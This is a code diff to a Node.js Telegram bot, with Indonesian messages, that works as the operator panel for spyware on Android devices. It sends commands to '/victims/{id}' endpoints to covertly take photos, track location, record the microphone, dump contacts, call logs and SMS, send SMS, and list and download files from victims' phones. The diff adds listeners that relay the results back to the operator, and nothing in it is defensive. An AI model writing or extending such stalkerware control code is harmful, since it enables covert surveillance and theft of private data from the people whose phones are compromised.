@@ -1,6 +1,6 @@
 const axios = require('axios');
 const main = require('../index');
-
+const resultListener = require('./resultListener');
 const API_URL = process.env.API_URL || 'http://localhost:3000/api';
 
 // Helper function untuk escape markdown characters
@@ -78,7 +78,7 @@ exports.listOnlineVictims = async (msg) => {
     });
 };
 
-// Camera Control
+// Camera Control - FIXED
 exports.cameraControl = (msg) => {
     const chatId = msg.chat.id;
 
@@ -121,11 +121,20 @@ exports.cameraControl = (msg) => {
                     main.bot.once('message', async (response) => {
                         const deviceId = response.text.trim();
 
+                        console.log('='.repeat(50));
+                        console.log('📸 CAMERA COMMAND DEBUG');
+                        console.log('Device ID:', deviceId);
+                        console.log('Chat ID (telegram_id):', chatId);
+                        console.log('User:', user);
+                        console.log('='.repeat(50));
+
                         try {
-                            await axios.post(`${API_URL}/victims/${deviceId}/camera`, {
+                            const result = await axios.post(`${API_URL}/victims/${deviceId}/camera`, {
                                 telegram_id: chatId,
                                 cameraId: 0
                             });
+
+                            console.log('Camera command result:', result.data);
 
                             const deviceName = nameMap[deviceId] || deviceId;
                             const successMessage = `✅ <b>Perintah foto berhasil dikirim!</b>
@@ -137,10 +146,19 @@ exports.cameraControl = (msg) => {
 Tunggu beberapa saat untuk hasil.`;
 
                             main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
+                            resultListener.listenForCameraResult(deviceId, chatId);
 
                         } catch (error) {
-                            console.error('Error sending camera command:', error);
-                            main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah foto.");
+                            console.error('Error sending camera command:', error.response?.data || error.message);
+
+                            let errorMsg = "❌ Gagal mengirim perintah foto.";
+                            if (error.response?.status === 403) {
+                                errorMsg = `❌ Access denied! Device ini bukan milik kamu atau tidak online.\n\nDevice ID: ${deviceId}\nTelegram ID: ${chatId}`;
+                            } else if (error.response?.status === 404) {
+                                errorMsg = "❌ Device tidak ditemukan atau sudah offline.";
+                            }
+
+                            main.bot.sendMessage(chatId, errorMsg);
                         }
                     });
                 }
@@ -153,7 +171,7 @@ Tunggu beberapa saat untuk hasil.`;
     });
 };
 
-// Location Control
+// Location Control - FIXED
 exports.locationControl = (msg) => {
     const chatId = msg.chat.id;
 
@@ -198,7 +216,7 @@ exports.locationControl = (msg) => {
 
                         try {
                             await axios.post(`${API_URL}/victims/${deviceId}/location`, {
-                                telegram_id: chatId
+                                telegram_id: chatId  // ← FIXED
                             });
 
                             const deviceName = nameMap[deviceId] || deviceId;
@@ -211,6 +229,7 @@ exports.locationControl = (msg) => {
 Tunggu beberapa saat untuk hasil.`;
 
                             main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
+                            resultListener.listenForLocationResult(deviceId, chatId);
 
                         } catch (error) {
                             console.error('Error sending location command:', error);
@@ -254,7 +273,7 @@ exports.smsControl = (msg) => {
     });
 };
 
-// Contacts Control
+// Contacts Control - FIXED
 exports.contactsControl = (msg) => {
     const chatId = msg.chat.id;
 
@@ -299,7 +318,7 @@ exports.contactsControl = (msg) => {
 
                         try {
                             await axios.post(`${API_URL}/victims/${deviceId}/contacts`, {
-                                telegram_id: chatId
+                                telegram_id: chatId  // ← FIXED
                             });
 
                             const deviceName = nameMap[deviceId] || deviceId;
@@ -312,6 +331,7 @@ exports.contactsControl = (msg) => {
 Tunggu beberapa saat untuk hasil.`;
 
                             main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
+                            resultListener.listenForContactsResult(deviceId, chatId);
 
                         } catch (error) {
                             console.error('Error sending contacts command:', error);
@@ -328,7 +348,7 @@ Tunggu beberapa saat untuk hasil.`;
     });
 };
 
-// Calls Control
+// Calls Control - FIXED
 exports.callsControl = (msg) => {
     const chatId = msg.chat.id;
 
@@ -373,7 +393,7 @@ exports.callsControl = (msg) => {
 
                         try {
                             await axios.post(`${API_URL}/victims/${deviceId}/calls`, {
-                                telegram_id: chatId
+                                telegram_id: chatId  // ← FIXED
                             });
 
                             const deviceName = nameMap[deviceId] || deviceId;
@@ -386,7 +406,7 @@ exports.callsControl = (msg) => {
 Tunggu beberapa saat untuk hasil.`;
 
                             main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
-
+                            resultListener.listenForCallsResult(deviceId, chatId);
                         } catch (error) {
                             console.error('Error sending calls command:', error);
                             main.bot.sendMessage(chatId, "❌ Gagal mengirim perintah riwayat panggilan.");
@@ -429,7 +449,7 @@ exports.filesControl = (msg) => {
     });
 };
 
-// Microphone Control
+// Microphone Control - FIXED
 exports.micControl = (msg) => {
     const chatId = msg.chat.id;
 
@@ -481,7 +501,7 @@ exports.micControl = (msg) => {
 
                         try {
                             await axios.post(`${API_URL}/victims/${deviceId}/microphone`, {
-                                telegram_id: chatId,
+                                telegram_id: chatId,  // ← FIXED
                                 duration: parseInt(duration)
                             });
 
@@ -496,6 +516,7 @@ exports.micControl = (msg) => {
 Tunggu beberapa saat untuk hasil.`;
 
                             main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
+                            resultListener.listenForMicResult(deviceId, chatId);
 
                         } catch (error) {
                             console.error('Error sending mic command:', error);
@@ -512,7 +533,7 @@ Tunggu beberapa saat untuk hasil.`;
     });
 };
 
-// Notification Control
+// Notification Control - FIXED
 exports.notificationControl = (msg) => {
     const chatId = msg.chat.id;
 
@@ -639,7 +660,7 @@ exports.handleDeviceCallback = async (query) => {
 
                             try {
                                 await axios.post(`${API_URL}/victims/${deviceId}/sms/list`, {
-                                    telegram_id: chatId
+                                    telegram_id: chatId  // ← FIXED
                                 });
 
                                 const deviceName = nameMap[deviceId] || deviceId;
@@ -652,6 +673,7 @@ exports.handleDeviceCallback = async (query) => {
 Tunggu beberapa saat untuk hasil.`;
 
                                 main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
+                                resultListener.listenForSmsResult(deviceId, chatId);
 
                             } catch (error) {
                                 console.error('Error sending SMS list command:', error);
@@ -714,7 +736,7 @@ Tunggu beberapa saat untuk hasil.`;
 
                             try {
                                 await axios.post(`${API_URL}/victims/${deviceId}/sms/send`, {
-                                    telegram_id: chatId,
+                                    telegram_id: chatId,  // ← FIXED
                                     to: phoneNumber,
                                     message: smsMessage
                                 });
@@ -785,7 +807,7 @@ Tunggu beberapa saat untuk hasil.`;
 
                             try {
                                 await axios.post(`${API_URL}/victims/${deviceId}/files/list`, {
-                                    telegram_id: chatId,
+                                    telegram_id: chatId,  // ← FIXED
                                     path: filePath
                                 });
 
@@ -800,6 +822,7 @@ Tunggu beberapa saat untuk hasil.`;
 Tunggu beberapa saat untuk hasil.`;
 
                                 main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
+                                resultListener.listenForFilesResult(deviceId, chatId);
 
                             } catch (error) {
                                 console.error('Error sending files list command:', error);
@@ -814,6 +837,7 @@ Tunggu beberapa saat untuk hasil.`;
                 main.bot.sendMessage(chatId, "❌ Error mengambil data device online.");
             }
         }
+
         // Files Download
         else if (data === 'files_download') {
             try {
@@ -860,17 +884,20 @@ Tunggu beberapa saat untuk hasil.`;
 
                             try {
                                 await axios.post(`${API_URL}/victims/${deviceId}/files/download`, {
-                                    telegram_id: chatId,
+                                    telegram_id: chatId,  // ← FIXED
                                     path: filePath
                                 });
 
                                 const deviceName = nameMap[deviceId] || deviceId;
                                 const successMessage = `✅ <b>Perintah download file berhasil dikirim!</b>
-            <b>Device:</b> ${deviceName}
+
+<b>Device:</b> ${deviceName}
 <b>ID:</b> <code>${deviceId}</code>
 <b>File:</b> ${filePath}
+
 ⬇️ File akan segera didownload.
 Tunggu beberapa saat untuk hasil.`;
+
                                 main.bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
 
                             } catch (error) {
@@ -893,14 +920,17 @@ Tunggu beberapa saat untuk hasil.`;
 
             try {
                 await axios.post(`${API_URL}/victims/${deviceId}/command`, {
-                    telegram_id: chatId,
+                    telegram_id: chatId,  // ← FIXED
                     order: 'x0000nf',
                     extra: 'status'
                 });
 
                 const statusMessage = `✅ <b>Checking notification status...</b>
+
 <b>Device ID:</b> <code>${deviceId}</code>
+
 🔔 Status akan segera didapatkan.`;
+
                 main.bot.sendMessage(chatId, statusMessage, { parse_mode: "HTML" });
 
             } catch (error) {
@@ -915,14 +945,17 @@ Tunggu beberapa saat untuk hasil.`;
 
             try {
                 await axios.post(`${API_URL}/victims/${deviceId}/command`, {
-                    telegram_id: chatId,
+                    telegram_id: chatId,  // ← FIXED
                     order: 'x0000nf',
                     extra: 'openSettings'
                 });
 
                 const settingsMessage = `✅ <b>Opening notification settings...</b>
+
 <b>Device ID:</b> <code>${deviceId}</code>
+
 ⚙️ Settings akan terbuka di device.`;
+
                 main.bot.sendMessage(chatId, settingsMessage, { parse_mode: "HTML" });
 
             } catch (error) {
